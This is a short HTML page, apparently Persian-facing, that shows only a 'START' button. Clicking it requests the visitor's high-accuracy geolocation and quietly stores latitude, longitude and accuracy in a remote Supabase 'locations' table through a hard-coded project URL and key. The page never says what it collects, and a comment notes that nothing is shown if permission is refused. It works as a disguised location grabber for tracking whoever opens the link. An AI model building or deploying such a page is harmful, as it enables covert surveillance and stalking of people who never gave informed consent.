<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>START</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #111;
}

button {
    width: 220px;
    height: 80px;
    font-size: 30px;
    border-radius: 15px;
    border: none;
    background: #008cff;
    color: white;
}

button:disabled {
    opacity: 0.5;
}
</style>
</head>

<body>

<button id="start">START</button>

<script>

const SUPABASE_URL = "https://cwagmwearaiurgmggyxd.supabase.co";

const SUPABASE_KEY = "sb_publishable_b1ga-fKeGD2NxCAp8mmF8Q_x9R4_az9";

const db = supabase.createClient(
    SUPABASE_URL,
    SUPABASE_KEY
);

const button = document.getElementById("start");


button.onclick = () => {

    navigator.geolocation.getCurrentPosition(

    async (position) => {

        await db
        .from("locations")
        .insert({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
        });

        button.disabled = true;

    },

    () => {

        // اگر اجازه داده نشد، هیچ پیامی نشان داده نمی‌شود
        button.disabled = false;

    },

    {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    }

    );

};

</script>

</body>
</html>
